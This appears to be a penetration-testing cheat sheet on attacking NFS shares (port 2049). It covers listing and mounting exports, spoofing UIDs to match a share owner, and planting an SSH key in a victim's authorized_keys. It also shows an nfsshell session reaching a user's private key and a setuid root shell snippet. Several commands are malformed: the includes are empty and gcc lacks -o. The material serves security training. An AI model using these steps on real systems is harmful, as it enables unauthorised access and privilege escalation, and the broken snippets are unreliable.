---
description: >-
  NFS security is partially based on the remote user mounting the filesystem
  having the same UID (User ID) and GID (Group ID) as the owner of that share.
---

# 2049 - NFS

We can find a NFS share if we query port 111 \(RPC\)

NFS security is partially based on the remote user mounting the filesystem having the same UID \(User ID\) and GID \(Group ID\) as the owner of that share. Restrictions can also be placed into the **/etc/hosts.allow** and **/etc/hosts.deny** files, but we won’t go into that here. Suffice to say, using the UID and GID as a basis for security isn’t the best way of doing it.

### Show shares:

`showmount -e {IP Address}` 

### Mount a share:

* Don't forget to create the share you mounting to \(/mnt/nfs\)...

`mount {IP Address}:/vol/share /mnt/nfs -nolock nfsserver=3` 

Example:

`root@kali:~# mount -t nfs 192.168.0.42:/var/nfs /mnt/test1 -o nolock` 

\*Mount Windows CIFS / SMB share on Linux at /mnt/cifs if you remove password it will prompt on the CLI \(more secure as it wont end up in bash\_history\) 

**Using username and password:** 

`mount -t cifs -o ro,domain=[domain],username=[username],password=[password],sec=ntlmv2 //hostnameOrIP/Share /path/to/localdir` 

Example: 

`mount -t cifs nfsserver=3 -o username=user,password=pass,domain=blah //192.168.1.X/share-name /mnt/cifs` 

### Unmount

`root@kali:~# umount -f -l /mnt/test1` 

### UID/GID Manipulation 

Can use nfsshell or use bash 

Add new user with the following commands: 

```text
groupadd --gid 1005 peter 
adduser peter --uid 101 --gid 1005
```

Now we can create ssh keys \(ssh-keygen\) and able copy the ssh key to the nfs share: 

`cat ~/.ssh/id_rsa.pub >> /mnt/peter/.ssh/authorized_keys` 

### Nfsshell 

Link: [https://github.com/NetDirect/nfsshell](https://github.com/NetDirect/nfsshell) or [nfsshell](../../tools/nfsshell.md)

Nfsshell is useful for accessing NFS shares without having to create users with the same UID/GID pair as the target exported filesystem 

**Example**: 

```text
root@kali:/opt/nfsshell# ./nfsshell  
nfs> host 192.168.0.45 
Using a privileged port (1021) 
Open 192.168.0.45 (192.168.0.45) TCP 
nfs> export 
Export list for 192.168.0.45: 
/home/karl               *  
nfs> mount /home/karl 
Using a privileged port (1020) 
Mount `/home/karl', TCP, transfer size 65536 bytes. 
nfs> ls -l 
drwxr-xr-x  3     1001  1001      4096  Mar  5  2019  . 
drwxr-xr-x  3     1001  1001      4096  Mar  5  2019  .. 
drwxr-xr-x  3     1001  1001      4096  Mar  5  2019  .bash_history 
drwxr-xr-x  3     1001  1001      4096  Mar  5  2019  .bash_logout 
drwxr-xr-x  3     1001  1001      4096  Mar  5  2019  .bashrc 
drwxr-xr-x  3     1001  1001      4096  Mar  5  2019  .lesshst 
drwxr-xr-x  3     1001  1001      4096  Mar  5  2019  .profile 
drwxr-xr-x  3     1001  1001      4096  Mar  5  2019  .ssh 
nfs> cd .ssh 
nfs> ls 
Readdir failed: Permission denied 
nfs> uid 1001 
nfs> gid 1001 
nfs> ls 
. 
.. 
authorized_keys 
id_rsa 
id_rsa.pub 
user.txt 
nfs>  
```

## Shell

We can obtain a shell via running the following code:

```text
cat << EOF >> shell.c
> #include 
> #include 
> #include 
> #include 
> int main()
> {
> setuid(0);
> system("/bin/bash");
> return 0;
> }
> EOF

gcc shell.c shell
./shell
```

